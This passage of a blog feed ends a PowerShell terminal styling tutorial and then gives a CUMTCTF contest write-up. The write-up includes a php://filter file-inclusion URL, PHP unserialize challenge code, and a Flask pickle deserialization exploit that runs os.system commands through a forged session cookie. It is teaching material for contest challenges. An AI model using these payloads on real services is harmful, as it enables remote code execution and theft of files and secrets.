id="Fluent-Terminal">          <a href="#Fluent-Terminal" class="heading-link"><i class="fas fa-link"></i></a>Fluent Terminal</h2>      <p>我最先使用的是这款，在github上搜索，然后下载后用ps运行文件夹下的<code>Install.ps1</code>即可，效果如下：</p><p><img src="/2020/03/22/psbeautify/2.png" alt></p><p>比起PS来已经美观多了，不过吹毛求疵的我还是感觉到了一丝丝不爽：</p><ol><li>启动时有时会加载不出左侧的命令提示符，或者比较慢，需要按下回车才能出来，总之初始化有时会有点卡</li><li>字体稍微有点模糊，锯齿略明显（在字体小的情况下），而且显示效果不舒服</li><li>设置项较少，跟不上我<del>装X</del>追求完美的步伐</li><li>复制粘贴时有点问题，有时候只能整行复制，选取不到某段字符</li></ol>        <h2 id="ConEmu">          <a href="#ConEmu" class="heading-link"><i class="fas fa-link"></i></a>ConEmu</h2>      <p><span class="exturl"><a class="exturl__link" href="https://www.fosshub.com/ConEmu.html" target="_blank" rel="noopener">官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下载安装即可</p>        <h3 id="界面配置">          <a href="#界面配置" class="heading-link"><i class="fas fa-link"></i></a>界面配置</h3>      <p>设置默认以PS启动</p><p><img src="/2020/03/22/psbeautify/3.png" alt></p><p>设置字体</p><p><img src="/2020/03/22/psbeautify/9.png" alt></p><p>设置背景图片</p><p><img src="/2020/03/22/psbeautify/4.png" alt></p><p>设置PS为默认shell</p><p><img src="/2020/03/22/psbeautify/5.png" alt></p>        <h3 id="设置配色">          <a href="#设置配色" class="heading-link"><i class="fas fa-link"></i></a>设置配色</h3>      <p>使用colortool来进行设置，colortool是微软出的一个powershell配色工具，支持Iterm主题</p><p>安装</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install colortool</span><br></pre></td></tr></table></div></figure><p>待续</p><p><strong>颜色设置</strong></p><p>PS的字体颜色中有许多很暗的颜色的，比如在输入<code>-xxxx</code>选项是黑灰色，分辨度很差，我们可以自己修改成想要的颜色，点击”settings”，转到颜色选项卡</p><p>选择自己喜欢的颜色方案</p><p><img src="/2020/03/22/psbeautify/10.png" alt></p><p>然后下面第8个一般是暗色，这个就是控制上述选项的（我是和我shell中的颜色对比确定的），我们选择一个自己喜欢的颜色，效果如下，清楚了许多</p><p><img src="/2020/03/22/psbeautify/11.png" alt></p><p>其它颜色修改也可以参照上面的方法自己DIY，最后记得要保存成自己的颜色方案</p>        <h1 id="效果展示">          <a href="#效果展示" class="heading-link"><i class="fas fa-link"></i></a>效果展示</h1>      <p><strong>cmder</strong>（该软件也有丰富的设置项，只是我没怎么搞而已，也是一个不错的软件）</p><p><img src="/2020/03/22/psbeautify/6.png" alt></p><p><strong>Fluent Terminal</strong></p><p><img src="/2020/03/22/psbeautify/7.png" alt></p><p><strong>ConEmu</strong></p><p><img src="/2020/03/22/psbeautify/8.png" alt></p><hr><p><span class="exturl"><a class="exturl__link" href="https://sspai.com/post/52868" target="_blank" rel="noopener">https://sspai.com/post/52868</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" href="https://iterm2colorschemes.com/" target="_blank" rel="noopener">https://iterm2colorschemes.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" href="https://github.com/JanDeDobbeleer/oh-my-posh" target="_blank" rel="noopener">https://github.com/JanDeDobbeleer/oh-my-posh</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爱美之心，人皆有之&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="http://chaosec.top/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="PowerShell" scheme="http://chaosec.top/tags/PowerShell/"/>
    
      <category term="美化" scheme="http://chaosec.top/tags/%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(二)</title>
    <link href="http://chaosec.top/2019/08/06/rootme1/"/>
    <id>http://chaosec.top/2019/08/06/rootme1/</id>
    <published>2019-08-06T03:47:10.000Z</published>
    <updated>2020-09-13T14:40:14.546Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password plz..." />    <label for="pass">Password plz...</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(一)</title>
    <link href="http://chaosec.top/2019/07/31/rootme/"/>
    <id>http://chaosec.top/2019/07/31/rootme/</id>
    <published>2019-07-31T09:45:39.000Z</published>
    <updated>2020-09-13T14:45:11.755Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="官方不建议公布wp，所以加密。可以email交流" />    <label for="pass">官方不建议公布wp，所以加密。可以email交流</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第三轮月赛与决赛</title>
    <link href="http://chaosec.top/2019/05/22/cumtctf3/"/>
    <id>http://chaosec.top/2019/05/22/cumtctf3/</id>
    <published>2019-05-22T08:36:44.000Z</published>
    <updated>2020-01-05T13:03:46.155Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="第三次双月赛题解">          <a href="#第三次双月赛题解" class="heading-link"><i class="fas fa-link"></i></a>第三次双月赛题解</h1>      <a id="more"></a>        <h2 id="Crypto">          <a href="#Crypto" class="heading-link"><i class="fas fa-link"></i></a>Crypto</h2>              <h3 id="古典密码签到">          <a href="#古典密码签到" class="heading-link"><i class="fas fa-link"></i></a>古典密码签到</h3>      <p>维吉尼亚密码，密文<code>juttaigykhpmjyreca</code>，秘钥<code>cumt</code>，在线解密即可<span class="exturl"><a class="exturl__link" href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>flag: <code>flag{hahayoufindtheflag}</code></p>        <h3 id="encode">          <a href="#encode" class="heading-link"><i class="fas fa-link"></i></a>encode</h3>      <p>题目给出的pyc文件，在线反编译一下即可得到源代码</p><p>很简单的解密题，按照相反的逻辑解密即可</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">final = <span class="string">'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='</span></span><br><span class="line"><span class="comment"># if encode3(encode2(encode1(flag))) == final:</span></span><br><span class="line"><span class="comment">#     print 'correct'</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print 'wrong'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i)</span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        x = x - <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i)</span><br><span class="line">        x = x - <span class="number">25</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> decode1(decode2(decode3(final)))</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="web">          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h2>              <h3 id="web签到1">          <a href="#web签到1" class="heading-link"><i class="fas fa-link"></i></a>web签到1</h3>      <p>简单的文件包含即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:30100&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cxk.php</span><br></pre></td></tr></table></div></figure><p>flag{CumtCTF_this_iS_a_RElLy_fLaG!!!}</p>        <h3 id="Web签到2">          <a href="#Web签到2" class="heading-link"><i class="fas fa-link"></i></a>Web签到2</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'string'</span>;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unserialize($_POST[<span class="string">'obj'</span>])-&gt;obj;</span><br></pre></td></tr></table></div></figure><p>flag{0k_y0u_4lr3ady_kn0w_uns3ria1ize}</p>        <h3 id="Baby-Flask">          <a href="#Baby-Flask" class="heading-link"><i class="fas fa-link"></i></a>Baby Flask</h3>      <p>flask项目的网站，查看源代码可以看到github网址，给出了网站源码，</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add secret key to enable session</span></span><br><span class="line"><span class="comment"># and this is a fake secret key, just an example</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'you_find_secret_key_congratulations'</span></span><br><span class="line"></span><br><span class="line">User = type(<span class="string">'User'</span>, (object,), &#123;</span><br><span class="line">    <span class="string">'uname'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'is_admin'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'__repr__'</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">'u'</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">'u'</span>] = u</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/file', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span><span class="params">()</span>:</span></span><br><span class="line">    path = request.args.get(<span class="string">'file'</span>)</span><br><span class="line">    path = os.path.join(<span class="string">'static'</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">'.py'</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">'.sh'</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">'..'</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'disallowed'</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/admin', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">'u'</span>)</span><br><span class="line">        print(pickle.loads(<span class="string">b'\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.'</span>))</span><br><span class="line">        <span class="keyword">if</span> isinstance(u, dict): </span><br><span class="line">            u = b64decode(u.get(<span class="string">'b'</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'welcome, admin'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'who are you?'</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'uhh?'</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></div></figure><p>可以看到file路由处可以进行文件读取</p><p><img src="https://i.loli.net/2019/05/04/5ccd332f17fc0.png" alt></p><p>查看历史提交记录可以看到某个版本中有如下语句</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.getenv(<span class="string">'secret_key'</span>)</span><br></pre></td></tr></table></div></figure><p>可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n</p><p><img src="https://i.loli.net/2019/05/04/5ccd33cc0a86f.png" alt></p><p>读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用<strong>reduce</strong>方法来进行命令执行</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">"`ls / -l &gt; /home/iv4n/3.txt`"</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(u)</span><br><span class="line">bu = base64.b64encode(u)</span><br><span class="line">print(bu)</span><br></pre></td></tr></table></div></figure><p>这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题）</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t &#123;&#39;u&#39;:&#123;&#39;b&#39;:b&#39;gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu&#39;&#125;&#125;</span><br></pre></td></tr></table></div></figure><p>然后修改cookie，刷新admin页面，然后去读文件</p><p><img src="https://i.loli.net/2019/05/04/5ccd37814e80f.png" alt></p><p>可以看到flag文件，直接读取即可</p><p><img src="https://i.loli.net/2019/05/04/5ccd37ed7cf35.png" alt></p><blockquote><p>PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell</p></blockquote><p>我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法</p><p>pickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;u&#39;:b&#39;\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.&#39;&#125;</span><br></pre></td></tr></table></div></figure><p>可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了<code>is_admin</code>的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = type(<span class="string">'User'</span>, (object,), &#123;</span><br><span class="line">    <span class="string">'uname'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'is_admin'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'__repr__'</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></div></figure><p><code>is_admin</code>又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？</p><p>我们可以通过将<code>is_admin</code>设置为类属性来解决</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.a = <span class="number">2</span></span><br><span class="line">        self.is_admin = <span class="number">1</span></span><br><span class="line">a=User()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br><span class="line">print(base64.b64encode(c))</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03K\x02X\x08\x00\x00\x00is_adminq\x04K\x01ub.&#39;</span><br></pre></td></tr></table></div></figure><p>可以看到<code>is_admin</code>被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含<code>__mian__</code>，和我们从网站解密的对比一下</p><blockquote><p>b’\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.’ </p></blockquote><p>同样位置是<code>program_main_app@@@</code>，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;\x80\x03cprogram_main_app@@@\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03K\x02X\x08\x00\x00\x00is_adminq\x04K\x01ub.&#39;</span><br></pre></td></tr></table></div></figure>        <h1 id="CUMTCTF-FINAL-2019">          <a href="#CUMTCTF-FINAL-2019" class="heading-link"><i class="fas fa-link"></i></a>CUMTCTF_FINAL_2019</h1>              <h2 id="MISC">          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>              <h3 id="委屈的兔兔">          <a href="#委屈的兔兔" class="heading-link"><i class="fas fa-link"></i></a>委屈的兔兔</h3>      <p>打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag</p><p>key{you are right}</p>        <h3 id="两岁半的猪">          <a href="#两岁半的猪" class="heading-link"><i class="fas fa-link"></i></a>两岁半的猪</h3>      <p>拖进stegsolve就会简单移位就可以看到二维码</p><p>flag{AppLeU0}</p>        <h3 id="寻找你的key">          <a href="#寻找你的key" class="heading-link"><i class="fas fa-link"></i></a>寻找你的key</h3>      <p>zip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag</p><p>KEY{dca57f966e4e4e31fd5b15417da63269}</p>        <h3 id="302">          <a href="#302" class="heading-link"><i class="fas fa-link"></i></a>302</h3>      <p>抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为<code>123.com</code>，然后用key值在线解密网站解密即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.atool9.com&#x2F;steganography.php</span><br></pre></td></tr></table></div></figure><p>flag{85bb86974a2a33bd4032ea3b7264b831}</p>        <h2 id="WEB">          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a>WEB</h2>              